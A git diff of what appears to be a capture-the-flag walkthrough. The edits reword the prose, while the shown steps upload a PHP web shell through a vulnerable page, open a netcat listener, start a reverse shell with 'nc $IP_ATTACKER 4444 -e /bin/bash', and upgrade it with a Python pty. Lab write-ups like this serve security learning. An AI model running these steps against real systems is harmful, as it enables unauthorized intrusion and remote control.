@@ -129,24 +129,24 @@ $ python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 ```
 
-And now from `/exposed.php` we curl it sending the file to `/uploads` leveraging the `-o` (output file) flag:
+And now from `/exposed.php` we curl it sending the file to `/uploads` leveraging `curl -o` (output file):
 ```
 10.10.14.23:8000/Predator.php -o uploads/Predator.php
 ```
 
-The shell is accessible from `uploads/Predator.php`, so let's set up a reverse shell using it.
+The shell is accessible now from `uploads/Predator.php`! Let's set up a reverse shell using it.
 
-Set `nc` listener in the attacker to handle the reverse shell:
+First, set a `nc` listener on the attacker to handle the reverse shell:
 ```
 nc -lvp 4444
 ```
 
-The web shell allows the user to execute in the target system. Connect to the attacker as follows:
+Then, set up the reverse shell by connecting to the listener from web shell (the web shell has a command execution feature, of course):
 ```
 nc $IP_ATTACKER 4444 -e /bin/bash
 ```
 
-Upgrade shell to more interactive one:
+From here it is immediately possible to run commands on the target from the attacker. Let's spawn a bash shell using Python (this is a very common trick to make it a bit more usable):
 ```
 python3 -c "import pty; pty.spawn('/bin/bash');"
 ```
